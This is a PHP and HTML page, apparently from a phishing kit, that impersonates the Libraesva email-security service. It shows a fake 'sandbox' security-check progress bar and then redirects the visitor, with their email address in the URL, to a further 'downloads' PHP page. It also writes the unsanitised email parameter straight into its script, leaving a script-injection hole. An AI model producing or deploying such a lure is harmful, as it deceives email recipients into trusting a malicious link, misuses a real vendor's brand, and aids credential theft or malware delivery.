<?php
    if(isset($_GET['email'])){
        $address = $_GET['email'];
    }
?>

<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<title>Checking... | Libraesva</title>
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
		<style>
			.box1{
				width:1200px;
				margin:0 auto;
				border: 1px solid rgb(35 149 65);
			}
			.box1 h5{
				border:2px solid rgb(35 149 65);
				margin-top:0;
				background-color: rgb(35 149 65);
				color:white;
				padding:8px 12px;
			}
			.box1 p{padding: 5px 12px;}
			
			/** Progress bar **/
			.meter {
			  box-sizing: content-box;
			  height: 15px; /* Can be anything */
			  position: relative;
			  margin: 40px 13px; /* Just for demo spacing */
			  background: #555;
			}
			.meter > span {
			  display: block;
			  height: 100%;
			  background-color: rgb(43, 194, 83);
			  background-image: linear-gradient(
				center bottom,
				rgb(43, 194, 83) 37%,
				rgb(84, 240, 84) 69%
			  );
			  box-shadow: inset 0 2px 9px rgba(255, 255, 255, 0.3),
				inset 0 -2px 6px rgba(0, 0, 0, 0.4);
			  position: relative;
			  overflow: hidden;
			}
			.meter > span:after,
			.animate > span > span {
			  content: "";
			  position: absolute;
			  top: 0;
			  left: 0;
			  bottom: 0;
			  right: 0;
			  background-image: linear-gradient(
				-45deg,
				rgba(255, 255, 255, 0.2) 25%,
				transparent 25%,
				transparent 50%,
				rgba(255, 255, 255, 0.2) 50%,
				rgba(255, 255, 255, 0.2) 75%,
				transparent 75%,
				transparent
			  );
			  z-index: 1;
			  background-size: 50px 50px;
			  animation: move 2s linear infinite;
			  border-top-right-radius: 8px;
			  border-bottom-right-radius: 8px;
			  border-top-left-radius: 20px;
			  border-bottom-left-radius: 20px;
			  overflow: hidden;
			}

			.animate > span:after {
			  display: none;
			}

			@keyframes move {
			  0% {
				background-position: 0 0;
			  }
			  100% {
				background-position: 50px 50px;
			  }
			}

			.orange > span {
			  background-image: linear-gradient(#f1a165, #f36d0a);
			}

			.red > span {
			  background-image: linear-gradient(#f0a3a3, #f42323);
			}

			.nostripes > span > span,
			.nostripes > span::after {
			  background-image: none;
			}

			#page-wrap {
			  width: 490px;
			  margin: 80px auto;
			}
			body {
			  color: #000;
			  font-family: system-ui, sans-serif;
			}
			h1 {
			  font-size: 42px;
			  font-weight: 600;
			  margin: 0 0 30px;
			}
			pre {
			  background: #000;
			  text-align: left;
			  padding: 20px;
			  margin: 0 auto 30px;
			}
			* {
			  box-sizing: border-box;
			}
			.p2{
				margin-top:-20px; 
				margin-bottom:-33px;
				font-size:16px
			}
			
		</style>
	</head>
	<body>

	<h1 style="text-align:center;font-weight:normal"><span style="color:rgb(35 149 65)">/</span>LIBRAESVA</h1>
	<div class="box1">
		<h5>Checking...</h5>
		<div id="flash">
			<p style="font-size:20px"><i class="fa fa-cog fa-fw"></i> Please wait, the sandbox is processing your request.</p>
			<p class="p2"> The security checks may take some time to complete.</p>
		</div>
		<div class="meter animate">
			<span style="width: 100%"><span></span></span>
		</div>
	</div>
	<script>
		setTimeout(function(){
			document.getElementById('flash').innerHTML = '<p style="font-size:20px"><i class="fa fa-check fa-fw"></i> Security check completed.</p><p class="p2" id="headingLoading"> Redirecting...</p>';
		}, 2000);
		
		setTimeout(function () {
			window.location.href="downloads/1dd58d173502c7d4d1cda67564c9d0f720220527111323/6845033.php?email=<?php echo $address ?>";
		}, 4000);
	</script>

	</body>
</html>